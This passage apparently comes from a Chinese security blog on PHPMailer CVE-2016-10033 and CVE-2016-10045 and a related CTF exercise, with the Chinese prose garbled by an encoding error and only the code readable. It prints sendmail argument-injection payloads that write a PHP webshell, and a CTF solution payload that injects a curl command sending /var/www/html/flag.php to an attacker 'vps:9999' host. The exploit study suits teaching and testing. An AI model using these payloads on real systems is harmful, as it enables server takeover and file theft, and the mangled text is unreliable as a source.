class="keyword">$this</span>-&gt;mailPassthru($toAddr, <span class="keyword">$this</span>-&gt;Subject, $body, $header, $params);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;doCallback($result, <span class="keyword">array</span>($toAddr), <span class="keyword">$this</span>-&gt;cc, <span class="keyword">$this</span>-&gt;bcc, <span class="keyword">$this</span>-&gt;Subject, $body, <span class="keyword">$this</span>-&gt;From);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $result = <span class="keyword">$this</span>-&gt;mailPassthru($to, <span class="keyword">$this</span>-&gt;Subject, $body, $header, $params);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;doCallback($result, <span class="keyword">$this</span>-&gt;to, <span class="keyword">$this</span>-&gt;cc, <span class="keyword">$this</span>-&gt;bcc, <span class="keyword">$this</span>-&gt;Subject, $body, <span class="keyword">$this</span>-&gt;From);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($old_from)) &#123;</span><br><span class="line">            ini_set(<span class="string">&#x27;sendmail_from&#x27;</span>, $old_from);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$result) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> phpmailerException(<span class="keyword">$this</span>-&gt;lang(<span class="string">&#x27;instantiate&#x27;</span>), <span class="built_in">self</span>::STOP_CRITICAL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>é‡ç‚¹å…³æ³¨ç¬¬12è¡Œï¼Œå¾ˆæ˜æ˜¾ <strong>$params</strong> æ˜¯ä» <strong>$this-&gt;Sender</strong> ä¼ è¿›æ¥çš„ï¼Œæˆ‘ä»¬æ‰¾ä¸€ä¸‹ <strong>$this-&gt;Sender</strong>ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setFrom</span>(<span class="params">$address, $name = <span class="string">&#x27;&#x27;</span>, $auto = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $address = trim($address);</span><br><span class="line">        $name = trim(preg_replace(<span class="string">&#x27;/[\r\n]+/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name)); <span class="comment">//Strip breaks and trim</span></span><br><span class="line">        <span class="comment">// Don&#x27;t validate now addresses with IDN. Will be done in send().</span></span><br><span class="line">        <span class="keyword">if</span> (($pos = strrpos($address, <span class="string">&#x27;@&#x27;</span>)) === <span class="literal">false</span> <span class="keyword">or</span></span><br><span class="line">            (!<span class="keyword">$this</span>-&gt;has8bitChars(substr($address, ++$pos)) <span class="keyword">or</span> !<span class="keyword">$this</span>-&gt;idnSupported()) <span class="keyword">and</span></span><br><span class="line">            !<span class="keyword">$this</span>-&gt;validateAddress($address)) &#123;</span><br><span class="line">            $error_message = <span class="keyword">$this</span>-&gt;lang(<span class="string">&#x27;invalid_address&#x27;</span>) . <span class="string">&quot; (setFrom) <span class="subst">$address</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setError($error_message);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;edebug($error_message);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;exceptions) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> phpmailerException($error_message);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;From = $address;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;FromName = $name;</span><br><span class="line">        <span class="keyword">if</span> ($auto) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;Sender = $address;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å°† <strong>$address</strong> ç»è¿‡æŸäº›å¤„ç†ä¹‹åèµ‹å€¼ç»™ <strong>$this-&gt;Sender</strong>ï¼Œç»§ç»­è¿½è¸ª<code>validateAddress</code>å‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validateAddress</span>(<span class="params">$address, $patternselect = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($patternselect)) &#123;</span><br><span class="line">            $patternselect = <span class="built_in">self</span>::$validator;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($patternselect)) &#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func($patternselect, $address);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Reject line breaks in addresses; it&#x27;s valid RFC5322, but not RFC5321</span></span><br><span class="line">        <span class="keyword">if</span> (strpos($address, <span class="string">&quot;\n&quot;</span>) !== <span class="literal">false</span> <span class="keyword">or</span> strpos($address, <span class="string">&quot;\r&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$patternselect <span class="keyword">or</span> $patternselect == <span class="string">&#x27;auto&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//Check this constant first so it works when extension_loaded() is disabled by safe mode</span></span><br><span class="line">            <span class="comment">//Constant was added in PHP 5.2.4</span></span><br><span class="line">            <span class="keyword">if</span> (defined(<span class="string">&#x27;PCRE_VERSION&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">//This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2</span></span><br><span class="line">                <span class="keyword">if</span> (version_compare(PCRE_VERSION, <span class="string">&#x27;8.0.3&#x27;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    $patternselect = <span class="string">&#x27;pcre8&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $patternselect = <span class="string">&#x27;pcre&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (function_exists(<span class="string">&#x27;extension_loaded&#x27;</span>) <span class="keyword">and</span> extension_loaded(<span class="string">&#x27;pcre&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">//Fall back to older PCRE</span></span><br><span class="line">                $patternselect = <span class="string">&#x27;pcre&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension</span></span><br><span class="line">                <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">&#x27;5.2.0&#x27;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    $patternselect = <span class="string">&#x27;php&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $patternselect = <span class="string">&#x27;noregex&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> ($patternselect) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;pcre8&#x27;</span>:</span><br><span class="line">                ......</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;pcre&#x27;</span>:</span><br><span class="line">                ......</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;html5&#x27;</span>:</span><br><span class="line">                ......</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;noregex&#x27;</span>:</span><br><span class="line">                <span class="comment">//No PCRE! Do something _very_ approximate!</span></span><br><span class="line">                <span class="comment">//Check the address is 3 chars or longer and contains an @ that&#x27;s not the first or last char</span></span><br><span class="line">                <span class="keyword">return</span> (strlen($address) &gt;= <span class="number">3</span></span><br><span class="line">                    <span class="keyword">and</span> strpos($address, <span class="string">&#x27;@&#x27;</span>) &gt;= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">and</span> strpos($address, <span class="string">&#x27;@&#x27;</span>) != strlen($address) - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;php&#x27;</span>:</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">boolean</span>)filter_var($address, FILTER_VALIDATE_EMAIL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªå‡½æ•°çš„å¤§æ¦‚æµç¨‹å°±æ˜¯ï¼š</p>
<ol>
<li>é»˜è®¤patternselect==â€˜autoâ€™ï¼Œå®ƒä¼šè‡ªåŠ¨é€‰æ‹©ä¸€ä¸ªæ–¹å¼å¯¹emailè¿›è¡Œæ£€æµ‹</li>
<li>å¦‚æœphpæ”¯æŒæ­£åˆ™PCREï¼ˆä¹Ÿå°±æ˜¯åŒ…å«<code>preg_replace</code>å‡½æ•°ï¼‰ï¼Œå°±ç”¨æ­£åˆ™çš„æ–¹å¼æ¥æ£€æŸ¥ï¼Œå°±æ˜¯é‚£ä¸€å¤§ä¸²å¾ˆéš¾è¯»æ‡‚çš„æ­£åˆ™</li>
<li>å¦‚æœphpä¸æ”¯æŒPCREï¼Œä¸”PHPç‰ˆæœ¬å¤§äºPHP5.2.0ï¼Œå°±æ˜¯ç”¨PHPè‡ªå¸¦çš„filteræ¥æ£€æŸ¥email</li>
<li>å¦‚æœphpä¸æ”¯æŒPCREï¼Œä¸”PHPç‰ˆæœ¬ä½äºPHP5.2.0ï¼Œå°±ç›´æ¥æ£€æŸ¥emailä¸­æ˜¯å¦åŒ…å«@</li>
</ol>
<p>å¦‚æœæ˜¯ç¬¬å››ç§æƒ…å†µçš„è¯ï¼Œè¿™ä¸ªæ—¶å€™è¯¥å‡½æ•°ä¼šä½¿ç”¨<code>noregex</code>çš„æ–¹å¼ï¼Œå³åªéœ€æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶å³å¯é€šè¿‡è¿‡æ»¤ï¼š</p>
<ul>
<li>è¾“å…¥é•¿åº¦å¤§äº 3</li>
<li>å«æœ‰<code>@</code></li>
<li><code>@</code>ä¸æ˜¯æœ€åä¸€ä¸ªå­—ç¬¦</li>
</ul>
<p>è¿™ä¸‰ä¸ªæ¡ä»¶æ¯”è¾ƒå®¹æ˜“æ»¡è¶³ï¼Œä¹Ÿæœ‰å¤ç°ç¯å¢ƒå’ŒPocï¼š<a href="https://github.com/opsxcq/exploit-CVE-2016-10033">https://github.com/opsxcq/exploit-CVE-2016-10033</a></p>
<p>ä½†æ˜¯æ»¡è¶³è¿™ä¸ªæƒ…å†µçš„ä¸»æœºç°åœ¨å·²ç»å¾ˆå°‘äº†ï¼Œæ­£å¸¸æƒ…å†µä¸‹éƒ½æ˜¯ä½¿ç”¨<code>pcre8</code>çš„æ­£åˆ™æ¥è¿›è¡Œè¿‡æ»¤ï¼Œæ‰€ä»¥å¦‚æœè¦æ‰©å¤§æ”»å‡»é¢éœ€è¦å¯¹æ­£åˆ™è¿›è¡Œç»•è¿‡ï¼Œå¹¶ä¸”è¿˜å¾—è®© sendmail æˆåŠŸæ‰§è¡Œã€‚</p>
<p>æœ‰å‡ ç§payloadå¯ä»¥ç»•è¿‡é‚£äº›çœ‹ç€å¤´å¤§çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š</p>
<blockquote>
<p>æ­£åˆ™è¡¨è¾¾å¼åˆ†æï¼š <a href="https://www.leavesongs.com/PENETRATION/how-to-analyze-long-regex.html">https://www.leavesongs.com/PENETRATION/how-to-analyze-long-regex.html</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&lt;?system($_GET[&#39;pew&#39;]);?&gt;&quot;. -OQueueDirectory&#x3D;&#x2F;tmp&#x2F;. -X.&#x2F;images&#x2F;zwned.php @swehack.org</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œä½¿ç”¨<code>.%20</code>ï¼ˆç‚¹+ç©ºæ ¼ï¼‰æ¥ä½œä¸ºåˆ†éš”ç¬¦ï¼Œå®é™…æµ‹è¯•ä¸€ä¸‹ï¼Œå·²ç»å†™å…¥äº†shell.php</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200616162846.png" alt=""></p>
<p>è®¿é—®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;1.php?x&#x3D;%22%3C?system($_GET[%27x%27]);?%3E%22.%20-OQueueDirectory&#x3D;&#x2F;tmp&#x2F;.%20-X&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php%20@a.com</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200616162748.png" alt=""></p>
<p>Pç‰›çš„payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaa( -X&#x2F;home&#x2F;www&#x2F;success.php -OQueueDirectory&#x3D;&#x2F;tmp )@qq.com</span><br></pre></td></tr></table></figure>
<h3 id="CVE-2016-10045">CVE-2016-10045</h3>
<p>Seebugæ–‡ç« ï¼š<a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p>
<h4 id="ç¯å¢ƒæ­å»º-v2">ç¯å¢ƒæ­å»º</h4>
<p>å’Œä¸Šé¢çš„ä¸€æ ·ï¼Œå°±æ˜¯æŠŠæºä»£ç æ¢æˆ5.2.20ç‰ˆæœ¬</p>
<h4 id="æ¼æ´åŸç†-v2">æ¼æ´åŸç†</h4>
<p>é¦–å…ˆçœ‹è¡¥ä¸ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200616150310.png" alt=""></p>
<p>é’ˆå¯¹ç”¨æˆ·è¾“å…¥ä½¿ç”¨ <strong>escapeshellarg</strong> å‡½æ•°è¿›è¡Œå¤„ç†ã€‚æ‰€ä»¥ï¼Œåœ¨æœ€æ–°ç‰ˆæœ¬ä¸­ä½¿ç”¨ä¹‹å‰çš„ payload è¿›è¡Œæ”»å‡»ä¼šå¤±è´¥ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a( -OQueueDirectory&#x3D;&#x2F;tmp -X&#x2F;var&#x2F;www&#x2F;html&#x2F;x.php )@a.com</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯ï¼Œå´å¯ä»¥ä½¿ç”¨ä¸‹é¢è¿™ä¸ª <strong>payload</strong> è¿›è¡Œæ”»å‡»ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39;( -OQueueDirectory&#x3D;&#x2F;tmp -X&#x2F;var&#x2F;www&#x2F;html&#x2F;x.php )@a.com</span><br></pre></td></tr></table></figure>
<p>å®é™…ä¸Šï¼Œå¯ç”¨äºæ”»å‡»çš„ä»£ç åªæ˜¯åœ¨ä¹‹å‰çš„åŸºç¡€ä¸Šå¤šäº†ä¸€ä¸ªå•å¼•å·ã€‚ä¹‹æ‰€ä»¥è¿™æ¬¡çš„æ”»å‡»ä»£ç èƒ½å¤ŸæˆåŠŸï¼Œæ˜¯å› ä¸ºä¿®å¤ä»£ç å¤šäº† <strong>escapeshellcmd</strong> å‡½æ•°ï¼Œç»“åˆä¸Š <strong>mail()</strong> å‡½æ•°åº•å±‚è°ƒç”¨çš„ <strong>escapeshellarg</strong> å‡½æ•°ï¼Œæœ€ç»ˆå¯¼è‡´å•å¼•å·é€ƒé€¸ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">&quot;a&#x27;( -OQueueDirectory=/tmp -X/var/www/html/shell.php )@qq.com&quot;</span>;</span><br><span class="line">$earg = escapeshellarg($payload);</span><br><span class="line">var_dump($earg);</span><br><span class="line">$ecmd = escapeshellcmd($earg);</span><br><span class="line">var_dump($ecmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200616173341.png" alt=""></p>
<p>æˆ‘ä»¬çš„ payload æœ€ç»ˆåœ¨æ‰§è¡Œæ—¶å˜æˆäº†<code>'-fa'\\''\( -OQueueDirectory=/tmp -X/var/www/html/test.php \)@a.com\'</code>ï¼Œåˆ†å‰²åå°±æ˜¯<code>-fa\(</code>ã€<code>-OQueueDirectory=/tmp</code>ã€<code>-X/var/www/html/test.php</code>ã€<code>)@a.com'</code>ï¼Œæœ€ç»ˆçš„å‚æ•°å°±æ˜¯è¿™æ ·è¢«æ³¨å…¥çš„ã€‚</p>
<h2 id="0x03-ç»ƒä¹ é¢˜">0x03 ç»ƒä¹ é¢˜</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$a</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/i&#x27;</span>,$key))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;are you a hacker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> $__R) &#123;</span><br><span class="line">    <span class="keyword">if</span>($$__R) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>($$__R <span class="keyword">as</span> $__k =&gt; $__v) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($$__k) &amp;&amp; $$__k == $__v) <span class="keyword">unset</span>($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST) &#123; waf($_POST);&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET) &#123; waf($_GET); &#125;</span><br><span class="line"><span class="keyword">if</span>($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;flag&#x27;</span>] === $_GET[<span class="string">&#x27;hongri&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($_GET[<span class="string">&#x27;flag&#x27;</span>] ) == md5($_GET[<span class="string">&#x27;hongri&#x27;</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        $urlInfo = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">&quot;http&quot;</span> === strtolower($urlInfo[<span class="string">&quot;scheme&quot;</span>]) || <span class="string">&quot;https&quot;</span>===strtolower($urlInfo[<span class="string">&quot;scheme&quot;</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $url = escapeshellarg($url);</span><br><span class="line">        $url = escapeshellcmd($url);</span><br><span class="line">        system(<span class="string">&quot;curl &quot;</span>.$url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">&quot;HRCTF&#123;Are_y0u_maz1ng&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="è€ƒç‚¹ä¸€">è€ƒç‚¹ä¸€</h3>
<blockquote>
<p>è¿™é‡Œæ¶‰åŠåˆ°å¯å˜å˜é‡çš„æ¦‚å¿µ</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> $__R) &#123;</span><br><span class="line">    <span class="keyword">if</span>($$__R) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>($$__R <span class="keyword">as</span> $__k =&gt; $__v) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($$__k) &amp;&amp; $$__k == $__v) <span class="keyword">unset</span>($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆå¾ªç¯è·å–è¶…å…¨å±€å˜é‡<code>_POST</code>ã€<code>_GET</code>ã€<code>_COOKIE</code>ï¼Œå¹¶ä¾æ¬¡èµ‹å€¼ç»™<code>$__R</code>ã€‚å†ç¬¬äºŒè¡Œåˆ¤æ–­<code>$$__R</code>æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨çš„è¯ï¼Œé‚£ä¹ˆç»§ç»­åˆ¤æ–­<code>_POST</code>ã€<code>_GET</code>ã€<code>_COOKIE</code>ä¸­æ˜¯å¦å­˜åœ¨é”®å€¼ç›¸ç­‰çš„ï¼Œå¦‚æœç›¸ç­‰åˆ™åˆ é™¤å˜é‡ã€‚</p>
<p>å‡å¦‚æˆ‘ä»¬é€šè¿‡GETæäº¤<code>flag=ca01h</code>ï¼Œæ¥ç€é€šè¿‡POSTæäº¤<code>_GET[flag]=ca01h</code>ã€‚é‚£ä¹ˆéå†<code>$_POST</code> è¶…å…¨å±€æ•°ç»„çš„æ—¶å€™ï¼Œ<code>$__key</code>å°±ç­‰äº<code>_GET[flag]</code>ï¼Œ<code>$__v</code>å°±ç­‰äº<code>ca01h</code>ï¼Œæ‰€ä»¥<code>$$__key</code>ç­‰äº<code>$_GET[flag]</code>ï¼Œå³ca01hï¼Œæ­¤æ—¶<code>$$__k==$__v</code>æˆç«‹ï¼Œå˜é‡<code>$_GET[flag]</code>å°±è¢«é‡Šæ”¾äº†ã€‚æ¥ç€å¦‚æœè¿™äº›è¶…å…¨å±€å˜é‡å­˜åœ¨çš„è¯ï¼Œå¯¹å®ƒä»¬çš„é”®åè¿›è¡Œä¸€ä¸ªwafè¿‡æ»¤ï¼Œä½†æ˜¯åœ¨ ç¬¬21è¡Œ å’Œ 22è¡Œ æœ‰è¿™æ ·ä¸€ä¸²ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br></pre></td></tr></table></figure>
<p><code>extract</code>æ˜¯å˜é‡è¦†ç›–å¸¸ç”¨çš„å‡½æ•°ï¼Œä½œç”¨æ˜¯å°†å¯¹è±¡å†…çš„é”®åå˜æˆä¸€ä¸ªå˜é‡åï¼Œè€Œè¿™ä¸ªå˜é‡å¯¹åº”çš„å€¼å°±æ˜¯è¿™ä¸ªé”®åçš„å€¼ï¼Œ<strong>EXTR_SKIP</strong> å‚æ•°è¡¨ç¤ºå¦‚æœå‰é¢å­˜åœ¨æ­¤å˜é‡ï¼Œä¸å¯¹å‰é¢çš„å˜é‡è¿›è¡Œè¦†ç›–å¤„ç†ã€‚ç”±äºæˆ‘ä»¬å‰é¢é€šè¿‡ POST è¯·æ±‚æäº¤ <code>_GET[flag]=test</code> ï¼Œæ‰€ä»¥è¿™é‡Œä¼šå˜æˆ <code>$_GET[flag]=test</code> ï¼Œè¿™é‡Œçš„<code>$_GET</code>å˜é‡å°±ä¸éœ€è¦å†ç»è¿‡ waf å‡½æ•°æ£€æµ‹äº†ï¼Œä¹Ÿå°±ç»•è¿‡äº†<code>preg_match(â€˜/flag/iâ€™,$key)</code>çš„é™åˆ¶ã€‚</p>
<h3 id="è€ƒç‚¹äºŒ">è€ƒç‚¹äºŒ</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;flag&#x27;</span>] === $_GET[<span class="string">&#x27;hongri&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($_GET[<span class="string">&#x27;flag&#x27;</span>] ) == md5($_GET[<span class="string">&#x27;hongri&#x27;</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        $urlInfo = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">&quot;http&quot;</span> === strtolower($urlInfo[<span class="string">&quot;scheme&quot;</span>]) || <span class="string">&quot;https&quot;</span>===strtolower($urlInfo[<span class="string">&quot;scheme&quot;</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $url = escapeshellarg($url);</span><br><span class="line">        $url = escapeshellcmd($url);</span><br><span class="line">        system(<span class="string">&quot;curl &quot;</span>.$url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒè¡Œå’Œç¬¬äº”è¡Œçš„ä¸¤ä¸ª<code>if</code>è¯­å¥ç”¨md5ç¢°æ’å°±å¯ä»¥ç»•è¿‡ï¼Œæ¥ä¸‹æ¥ä¸»è¦è€ƒå¯Ÿcurlè¯»å–æ–‡ä»¶ã€‚</p>
<p>åœ¨ curl ä¸­å­˜åœ¨ -F æäº¤è¡¨å•çš„æ–¹æ³•ï¼Œå¯ä»¥æäº¤æ–‡ä»¶ã€‚<code> -F &lt;key=value&gt;</code> å‘æœåŠ¡å™¨POSTè¡¨å•ï¼Œä¾‹å¦‚ï¼š <code>curl -F â€œweb=@index.html;type=text/htmlâ€ url.com</code> ã€‚æäº¤æ–‡ä»¶ä¹‹åï¼Œåˆ©ç”¨ä»£ç†çš„æ–¹å¼è¿›è¡Œç›‘å¬ï¼Œè¿™æ ·å°±å¯ä»¥æˆªè·åˆ°æ–‡ä»¶äº†,åŒæ—¶è¿˜ä¸å—æœ€åçš„çš„å½±å“ã€‚</p>
<p>è¿™é‡Œçš„ <strong>ç¬¬11è¡Œ</strong> å’Œ <strong>ç¬¬12è¡Œ</strong> å¢åŠ äº†ä¸¤ä¸ªè¿‡æ»¤ï¼Œå‚ç…§ä¸Šé¢çš„çŸ¥è¯†ç‚¹ç»•è¿‡ã€‚</p>
<p>æ‰€ä»¥è¿™é¢˜æœ€åçš„ <strong>payload</strong> ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?flag&#x3D;QNKCDZO&amp;hongri&#x3D;s878926199a&amp;url&#x3D;http:&#x2F;&#x2F;baidu.com&#x2F;&#39; -F file&#x3D;@&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php -x  vps:9999</span><br></pre></td></tr></table></figure>
<p>POSTï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_GET[flag]&#x3D;QNKCDZO&amp;_GET[hongri]&#x3D;s878926199a&amp;_GET[url]&#x3D;http:&#x2F;&#x2F;baidu.com&#x2F;&#39; -F file&#x3D;@&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php -x  vps:9999</span><br></pre></td></tr></table></figure>
<h2 id="0x04-é™„åŠ ç»ƒä¹ é¢˜">0x04 é™„åŠ ç»ƒä¹ é¢˜</h2>
<p>é¢˜ç›®åœ°å€ï¼š[BUU2018 Online Tool](<a href="https://buuoj.cn/challenges#">https://buuoj.cn/challenges#</a>[BUUCTF 2018]Online Tool)</p>
<p>æºç ï¼š</p>
